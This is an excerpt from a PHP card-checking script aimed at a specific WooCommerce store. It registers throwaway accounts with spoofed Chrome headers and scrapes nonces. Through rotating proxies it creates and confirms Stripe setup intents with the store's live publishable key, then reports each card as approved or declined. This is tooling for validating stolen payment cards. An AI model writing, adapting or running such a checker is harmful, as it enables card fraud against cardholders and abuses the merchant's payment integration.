...
$get_url = "https://minipreview.com/my-account/";
...
#echo '<span class="text text-success">register_nonce</span> <span class="text text-success">➔ '.$register_nonce.'</span><br>';

$create_url = "https://minipreview.com/my-account/";
...
$create_headers = [
    ...
    "origin: https://minipreview.com",
    "priority: u=0, i",
    "referer: https://minipreview.com/my-account/",
    'sec-ch-ua: "Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
    "sec-ch-ua-mobile: ?0",
    'sec-ch-ua-platform: "Windows"',
    "sec-fetch-dest: document",
...
$create_data = http_build_query([
    ...
    "wc_order_attribution_session_entry" => "https://minipreview.com/my-account/",
    "wc_order_attribution_session_start_time" => "2025-06-28 03:04:37",
...
#echo '<span class="text text-success">Response Code</span> <span class="text text-success">➔ '.$http_code.'</span><br>';

$pay_url = "https://minipreview.com/my-account/add-payment-method/";
...
$pay_headers = [
    ...
    "accept-language: en-US,en;q=0.9",
    "priority: u=0, i",
    "referer: https://minipreview.com/my-account/add-payment-method/",
    'sec-ch-ua: "Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
    "sec-ch-ua-mobile: ?0",
    'sec-ch-ua-platform: "Windows"',
    "sec-fetch-dest: document",
...
$add_card_nonce = preg_match('/"nonce"\s*:\s*"([^"]+)"/', $pay_response, $m) ? $m[1] : null;
#echo '<span class="text text-success">🧩 add_card_nonce</span> <span class="text text-success">➔ '.$add_card_nonce.'</span><br>';


$cs_url = "https://minipreview.com/?wc-ajax=wc_stripe_frontend_request&path=/wc-stripe/v1/setup-intent";
...
$cs_post_fields = http_build_query([
    'payment_method' => 'stripe_cc',
    '_wpnonce' => $add_card_nonce,
    'context' => 'add_payment_method'
]);

$ch = curl_init($cs_url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $cs_headers);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $cs_post_fields);
curl_setopt($ch, CURLOPT_ENCODING, "");
curl_setopt($ch, CURLOPT_PROXY, $proxylocate);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxylogins); 
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $cookies, CURLOPT_COOKIEJAR => $cookies]); 
$cs_response = curl_exec($ch);
$data = json_decode($cs_response, true);
$cintent = $data['intent']['id'] ?? null;
$csecret = $data['intent']['client_secret'] ?? null;
#echo '<span class="text text-success">cs_response</span> <span class="text text-success">➔ '.$cs_response.'</span><br>';
#echo '<span class="text text-success">cintent</span> <span class="text text-success">➔ '.$cintent.'</span><br>';
#echo '<span class="text text-success">csecret</span> <span class="text text-success">➔ '.$csecret.'</span><br>';
#echo '<span class="text text-success">IP</span> <span class="text text-success">➔ '.$ipa.'</span><br>';
if (!$cintent || !$csecret) {
    echo '<span class="text text-danger">Decline</span> <span class="text text-danger">➔ '.$card.' ➔  ❌ Unable to proceed: Missing intent ID or client secret.</span><br>';
    exit;
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.stripe.com/v1/setup_intents/$cintent/confirm");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
...
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    'return_url' => 'https://minipreview.com/wc-api/stripe_add_payment_method/?nonce=' . $add_card_nonce . '&payment_method=stripe_cc&context=add_payment_method',
    'mandate_data[customer_acceptance][type]' => 'online',
    'mandate_data[customer_acceptance][online][ip_address]' => $ipa,
    'mandate_data[customer_acceptance][online][user_agent]' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
    ...
    'use_stripe_sdk' => 'true',
    'key' => 'pk_live_51R8XSaKNymSXR999Yp2YRa1j4fMXmiwxklNi7j4bVlAHBymixV81hbIijmNU44oS5EguWe3ZulLkoTvYTGuMjmM8002k7f1yMQ',
    '_stripe_account' => 'acct_1R8XSaKNymSXR999',
    '_stripe_version' => '2022-08-01',
    'client_secret' => $csecret
]));
$final_response = curl_exec($ch);
$securestate = json_decode($final_response, true)['status'] ?? null;
$decline_code = json_decode($final_response, true)['error']['decline_code'] ?? null;
$cmessage = json_decode($final_response, true)['error']['message'] ?? null;
#echo '<span class="text text-success">final_response</span> <span class="text text-success">➔ '.$final_response.'</span><br>'; 
#echo '<span class="text text-success">securestate</span> <span class="text text-success">➔ '.$securestate.'</span><br>'; 
#echo '<span class="text text-success">Message</span> <span class="text text-success">➔ '.$cmessage.'</span><br>'; 
#echo '<span class="text text-success">decline_code</span> <span class="text text-success">➔ '.$decline_code.'</span><br>'; 
...
if ($securestate === 'requires_action') {
    ...
    if (($state == "succeeded") || ($state == "attempted") || ($state == "processing_error")){
        ...
        $get_url = "https://api.stripe.com/v1/setup_intents/{$cintent}?is_stripe_sdk=false&client_secret={$csecret}&key=pk_live_51R8XSaKNymSXR999Yp2YRa1j4fMXmiwxklNi7j4bVlAHBymixV81hbIijmNU44oS5EguWe3ZulLkoTvYTGuMjmM8002k7f1yMQ";
    ...
    if ($securestate === 'succeeded') {
        ...
        echo '<span class="text text-danger">Decline</span> <span class="text text-danger">➔ '.$card.' ➔ '.$cmessage.'('.$decline_code.')</span><br>';
    }
}
unset($ch);
unlink($cookies);
